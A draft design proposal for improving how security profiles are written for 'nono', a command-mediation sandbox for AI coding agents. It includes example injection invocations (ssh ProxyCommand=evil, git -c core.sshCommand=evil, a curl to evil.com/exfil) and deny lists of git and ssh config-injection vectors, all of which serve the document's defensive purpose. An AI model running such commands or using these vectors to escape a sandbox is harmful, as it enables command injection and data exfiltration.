# Mediation Profile Authoring UX Improvements

**Date:** 2026-05-14  
**Status:** Draft  
**Context:** Follows nono#31 (argv_shape, nonce_scope, parent_sandbox) and nono#38 (ArgsMatcher, Passthrough, per-intercept sandbox)

---

## Summary

As the mediation layer gains richer primitives, profile authoring has become a multi-system
workflow: write JSON matchers, write bash scan wrappers, copy entries across four profile
files, and test by running live sessions. This proposal unifies those layers into a single
declarative profile format backed by native tooling.

---

## Problem

### Three separate systems with no shared schema

Adding a new mediated binary currently requires touching three independent systems:

1. **Profile JSON** — intercept rules using `args_prefix`, `argv_shape`, or `ArgsMatcher`
2. **Bash scan wrappers** — `git-scan-wrapper.sh`, `ssh-scan-wrapper.sh` — which scan
   on-disk gitconfig, process environment, and argv for config-injection vectors
3. **Four profile files** — darwin/claude.json, darwin/pi.json, darwin/opencode.json,
   linux/claude.json — maintained independently

None of these systems validate against each other. A regex error in an `ArgsMatcher` leaf
surfaces only at session start. A missing deny-list entry in a wrapper silently allows the
dangerous pattern through. Profile files drift out of sync invisibly.

### The split-form argv gap

`ArgsMatcher` and `argv_shape` see argv as a flat string array. When a CLI accepts
`--flag value` as two separate tokens, the value is invisible to any matcher:

```
kubectl --kubeconfig /evil/config get pods
argv: ["--kubeconfig", "/evil/config", "get", "pods"]
```

There is no `ArgsMatcher` leaf that says "match when the token after `--kubeconfig` is
outside `~/.kube/`." The ssh scan wrapper handles this via a manual loop pairing argv[i]
with argv[i+1]. Any new binary with split-form flags and security-sensitive values needs
the same bespoke bash loop.

### Matcher selection is ambiguous

Three overlapping matchers exist with no clear guidance on when to use which:

- `args_prefix` — positional prefix, strips flags
- `argv_shape` — structured, flag-aware, exact shape, `on_mismatch: approve`
- `ArgsMatcher` — regex predicate tree, arbitrary boolean logic

`args_prefix` is a strict subset of both others. Profile authors must choose between them
without a clear decision rule, and can mix them across rules in the same command entry.

### No validation tooling

There is no way to verify a profile entry is correct without running a live session and
checking audit logs. Behavioral mismatches — a rule that fires when it shouldn't, or
doesn't fire when it should — are only discovered in production.

---

## Proposed Changes

### 1. `flag_value_matches` leaf in `ArgsMatcher`

A new `ArgsMatcher` leaf that understands both combined and split flag forms:

```json
{ "flag_value_matches": { "flag": "-o", "value_regex": "^ProxyCommand" } }
```

Fires when the flag appears in any of its accepted forms:

```bash
ssh -o ProxyCommand=evil host        # split, = separator
ssh -oProxyCommand=evil host         # combined
kubectl --kubeconfig /evil/config    # long flag, split
kubectl --kubeconfig=/evil/config    # long flag, = separator
```

This eliminates the need for the manual argv-pair loop in `ssh-scan-wrapper.sh` and makes
`kubectl --kubeconfig /evil/path` expressible as a profile rule.

**Implementation:** `ArgsMatcher::FlagValueMatches { flag: String, value_regex: String }`
and `ResolvedArgsMatcher::FlagValueMatches { flag: String, regex: Regex }`. The
`matches(&self, args: &[String])` implementation scans argv recognizing combined,
split, and `=`-separated forms. One additional variant in both enums.

**Example — block ssh ProxyCommand:**
```json
{
  "match": { "not": { "flag_value_matches": { "flag": "-o", "value_regex": "^ProxyCommand" } } },
  "action": { "type": "passthrough" }
}
```

**Example — block kubectl with out-of-tree kubeconfig:**
```json
{
  "match": {
    "flag_value_matches": {
      "flag": "--kubeconfig",
      "value_regex": "^(?!.*\\.kube/).*"
    }
  },
  "action": { "type": "respond", "stdout": "", "exit_code": 126 }
}
```

---

### 2. Native `pre_exec_scan` profile field

Move env var and config file scanning from bash into nono as a declarative profile field.
Eliminates bash scan wrappers for the common case.

```json
{
  "name": "git",
  "pre_exec_scan": {
    "env_deny": {
      "hard": ["GIT_CONFIG_PARAMETERS", "GIT_CONFIG_COUNT"],
      "gate": ["GIT_SSH_COMMAND", "GIT_EXTERNAL_DIFF", "GIT_SSH",
               "GIT_EDITOR", "GIT_PAGER", "GIT_ASKPASS"]
    },
    "git_config_deny": {
      "hard": ["include.path", "core.hookspath"],
      "hard_prefixes": ["includeif."],
      "gate": ["core.sshCommand", "core.pager", "core.editor",
               "core.askpass", "credential.helper", "gpg.program"],
      "gate_prefixes": ["filter.", "credential.", "diff.", "mergetool."]
    }
  }
}
```

**`hard`** — deny without consulting the approval gate. Exit 126, audit event with
`verdict_source: hardcoded`. Maps to the no-approve-ever set in the current wrappers.
A missing or unreachable broker never promotes a hard entry to allow.

**`gate`** — consult `ApprovalGate` (nono#31). `allow_once` / `allow_always` proceeds;
`deny` or unreachable broker falls through to deny. Fail-closed: a missing broker is
always a deny, not a pass.

**`git_config_deny`** — nono runs `git config --list --show-origin` before exec, with
`-c core.pager=cat -c core.editor=true -c core.askpass=true` to neutralize extension
points during the read. `command line:` origin entries are skipped (they are the
neutralization overrides, not the stored config). Keys are lowercased before comparison,
matching git's own behavior.

**What this replaces:**  `git-scan-wrapper.sh` and `ssh-scan-wrapper.sh` in their
entirety for the env and config-scan portions. Once `pre_exec_scan` ships, `binary_path`
overrides pointing at scan wrappers and their `fs_read_file` entries can be removed.

**What it does not replace:** Wrapper logic unrelated to scanning — for example,
`resolve_real_binary` (find the real binary past nono shims and symlinks). That either
stays in a minimal wrapper or moves into nono's binary resolution path as a separate
concern.

**Platform behavior:** `git_config_deny` works on Linux unchanged. `env_deny` works
everywhere. No platform-specific branches needed in the profile.

---

### 3. Profile inheritance

A `base` field that lets a profile extend another, merging command entries and overriding
only what differs.

```json
{
  "base": "./profiles/base.json",
  "commands": [
    {
      "name": "git",
      "extends": "base",
      "pre_exec_scan": {
        "env_deny": { "gate": ["GIT_SSH_COMMAND"] }
      }
    }
  ]
}
```

**Merge semantics:**

| Field | Merge rule |
|---|---|
| `intercept` | Child rules prepended (first-match-wins) |
| `sandbox` | Deep merge; child wins on conflict |
| `pre_exec_scan.*.hard` | Union; `hard` in either → `hard` in merged result |
| `pre_exec_scan.*.gate` | Union minus any entries promoted to `hard` |
| `caller_policy` | Replaced wholesale by child if present |
| `nonce_scope` | Replaced wholesale by child if present |

**Motivation:** darwin/claude.json, darwin/pi.json, and darwin/opencode.json share
roughly 80% of their command entries today. A new binary added to one must be manually
copied to all three. With inheritance, `base.json` holds the common rules; per-agent
profiles override only what differs — pi has no approve rules, linux drops keychain and
ssh-specific entries.

**Non-goal:** Deep recursive inheritance chains or mixin composition. One level of
`base` covers the primary use case. Multiple bases are out of scope.

---

### 4. Deprecate `args_prefix`; clarify `argv_shape` vs `ArgsMatcher`

`args_prefix` is a strict subset of both `argv_shape` and `ArgsMatcher`'s `Prefix`
variant. It adds surface area without adding capability. With three overlapping matchers,
profile authors have no clear rule for which to reach for.

**Deprecation path:**
- Profile load emits a `warn`-level log when `args_prefix` is present (not an error —
  existing profiles continue working)
- Documentation updated to show `argv_shape` and `ArgsMatcher` as the two canonical
  choices
- `args_prefix` removed in the next major version

**Decision rule for profile authors:**

| Situation | Use |
|---|---|
| You know the exact valid shape; deviations should go to the approval gate | `argv_shape` with `on_mismatch: approve` |
| You need flexible matching: URL anywhere in argv, regex on flag value, boolean logic | `ArgsMatcher` |

This replaces a three-way choice with a two-way choice backed by a clear criterion.

---

### 5. `nono profile test` dry-run command

```
nono profile test <command-name> <quoted-invocation>
nono profile validate <profile-file>
```

Evaluates a profile against a simulated invocation without execing the binary. Shows
which rule fired, which sandbox applies, and what the agent would observe.

```
$ nono profile test git 'git -c core.sshCommand=evil push origin main'
pre_exec_scan: hard-deny
  match:   git_config_deny.hard["core.sshCommand"]
  verdict: hardcoded
  exit:    126

$ nono profile test curl 'curl https://gitlab.example.com/api/v4/projects'
intercept: rule 0 matched
  matcher: all[any_arg_matches("gitlab\\.example\\.com"), not(any_arg_matches("--insecure"))]
  action:  passthrough
  sandbox: {allowed_hosts: ["gitlab.example.com"]}
  env:     HTTPS_PROXY=http://127.0.0.1:<port>

$ nono profile test curl 'curl https://evil.com/exfil'
intercept: no rule matched
  fallback: cmd.sandbox {block: true}
  sandbox:  {block: true}
  note:     proxy would deny CONNECT to evil.com (not in allowed_hosts)
```

`nono profile validate` reports:
- Regex compile errors in `ArgsMatcher` leaves
- Unknown fields in `argv_shape` or `pre_exec_scan`
- Rules that can never match (e.g. `any_arg_matches` pattern that matches no string)
- Deprecated `args_prefix` usage
- `nonce_scope` consumers that don't appear as command names in the same profile

---

## Impact on adding a new binary

**Before (with nono#31 + nono#38):**
1. Choose between three matchers; write regexes by hand; guess at split-form coverage
2. Write a new bash scan wrapper if the binary has config-injection risk (boilerplate
   sourcing, deny arrays, approval gate IPC, fail-closed logic, ~100–150 lines)
3. Add `binary_path` and `fs_read_file` entries for the wrapper to the profile sandbox
4. Copy the full entry to four profile files
5. Test by running a live session and checking audit logs

**After:**
1. Write intercept rules using `argv_shape` or `ArgsMatcher`; use `flag_value_matches`
   for split-form flags
2. Add `pre_exec_scan` with `env_deny` and (if applicable) `git_config_deny`
3. Write the entry once in `base.json`; per-agent profiles inherit automatically
4. Run `nono profile test <binary> '<invocation>'` to verify before deploying

---

## Non-goals

- **GUI profile editor** — out of scope
- **Auto-generating profiles from binary introspection** — interesting future work
- **Multi-level or mixin inheritance** — one base level is sufficient; more adds
  complexity without proportional value
- **Replacing `argv_shape`** — it solves a distinct problem (exact-shape enforcement
  with gate routing on deviation) and is not redundant with `ArgsMatcher`

---

## Open questions

1. Should `flag_value_matches` handle `=`-separated long flags (`--flag=value`) as a
   built-in form, or is matching on the combined token via `any_arg_matches` sufficient
   for that case?

2. Should `git_config_deny` be generalized to a `config_file_deny` with a configurable
   dump command, so it works for tools other than git (e.g. `ssh -G` to dump merged
   ssh config)?

3. For `nono profile test` against a `gate` entry in `pre_exec_scan`: should the
   simulation assume deny (conservative, matches fail-closed behavior when no broker is
   running) or prompt the user?

4. Should `nonce_scope` consumer validation in `nono profile validate` be a warning or
   an error? A consumer that doesn't appear in the same profile might be legitimate
   (e.g. a command present on the system but not mediated).
